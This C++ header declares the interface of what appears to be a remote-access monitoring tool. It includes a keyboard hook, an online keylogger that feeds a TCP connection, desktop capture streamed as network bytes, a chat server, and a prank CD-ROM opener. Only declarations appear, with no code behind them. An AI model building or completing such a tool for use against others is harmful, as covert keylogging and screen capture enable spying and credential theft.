
extern "C" bool SetPrivateHeap(HANDLE&);
extern "C" bool SetCmdShowType(int intType);

bool InstallKeyBoardHook(void);
bool UnInstallKeyBoardHook(void);

//---------------Fun Plugin Exported Functions---------//

extern "C"   UINT64   RegisterAsFunPluginClient    (void);
extern "C"   bool     StartOrStopKeyBoardFunPlugin (UINT64 Address,bool IsStart);
extern "C"   bool     UnRegisterAsFunPluginClient  (UINT64 Address);
extern "C"   bool     OpenOrCloseCDRom(UINT64 Address,bool IsOpen=true);   


/*-----------Screen Monitor Functions--------*/

extern "C" UINT64 RegisterAsScreenMonitorUser(BYTE Compression=SCREEN_MONITOR_COMPRESS_NIL);
extern "C" bool   RemoveScreenMonitorUser(UINT64  Address);
extern "C" bool   SetCompressionOrType(UINT64  Address,BYTE TypeOrCompression,bool IsType=true);
extern "C" UINT32 ScreenMonitorWriteToNetworkByteStream(UINT64  Address,BYTE* &OutByteStream);
extern "C" UINT32 ScreenMonitorReadFromNetworkByteStream(UINT64  Address,BYTE *InByteStream);
extern "C" bool   CaptureOrReplaceDesktopOrWindowImage(UINT64 Address,bool IsCapture,bool IsDesktop,HWND hWnd);
extern "C" bool   LoadOrSaveImage(UINT64 Address,bool IsLoad,bool IsCompress,TCHAR *FileName);

/*-----------Chat Server Functions-------------*/

extern "C" UINT64 RegisterAsChatServer(void);
extern "C" bool   RemoveChatServer(UINT64  Address);
extern "C" bool   ServiceChatClient(UINT64  Address,CTcpNwMonitorConnection TcpConnection);

/*-----------On Line KeyLogger Function--------*/

bool AddOnLineKeyLoggerClient(CTcpNwMonitorConnection TcpConnection);

